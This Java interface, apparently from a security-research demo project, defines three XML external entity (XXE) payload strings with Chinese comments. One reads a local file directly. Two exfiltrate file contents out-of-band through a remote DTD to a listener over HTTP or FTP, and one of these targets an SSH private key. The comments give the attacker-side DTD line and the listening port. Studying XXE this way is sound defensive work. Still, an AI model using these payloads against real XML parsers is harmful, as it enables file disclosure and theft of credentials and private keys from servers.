package com.threedr3am.bug.xxe;

/**
 * 各种xml xxe payload
 *
 * @author xuanyh
 */
public interface Payloads {

  /**
   * 有回显的payload xml
   *
   * 读取/tmp/aaa文件内容
   */
  String FEEDBACK =
      "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
    + "<!DOCTYPE root ["
    + "        <!ENTITY xxe SYSTEM \"file:///tmp/aaa\">"
    + "        ]>"
    + "<root>&xxe;</root>";

  /**
   * 没有回显，只能带出去的payload xml，读取文件单行
   *
   * 读取/tmp/aaa文件内容
   * 127.0.0.1:80的http web服务器存放xxe.dtd文件：
   * <!ENTITY % all "<!ENTITY send SYSTEM 'http://127.0.0.1:23232?file=%file;' >">
   * 监听23232端口
   */
  String NO_FEEDBACK_SINGLE_LINE =
      "<?xml version=\"1.0\" ?>"
    + "<!DOCTYPE note ["
    + "   <!ENTITY % file SYSTEM \"file:///tmp/aaa\">"
    + "   <!ENTITY % remote SYSTEM \"http://127.0.0.1:80/xxe.dtd\">"
    + "   %remote;%all;"
    + "]>"
    + "<root>&send;</root>";

  /**
   * 没有回显，只能带出去的payload xml，读取文件多行
   *
   * 读取/tmp/aaa文件内容
   * 127.0.0.1:80的http web服务器存放xxe.dtd文件：
   * <!ENTITY % all "<!ENTITY send SYSTEM 'ftp://127.0.0.1:23232?file=%file;' >">
   * 监听23232端口
   */
  String NO_FEEDBACK_MULT_LINE =
      "<?xml version=\"1.0\" ?>"
    + "<!DOCTYPE note ["
    + "   <!ENTITY % file SYSTEM \"file:///Users/xuanyh/.ssh/id_rsa\">"
    + "   <!ENTITY % remote SYSTEM \"http://127.0.0.1:80/xxe_mult.dtd\">"
    + "   %remote;%all;"
    + "]>"
    + "<root>&send;</root>";
}
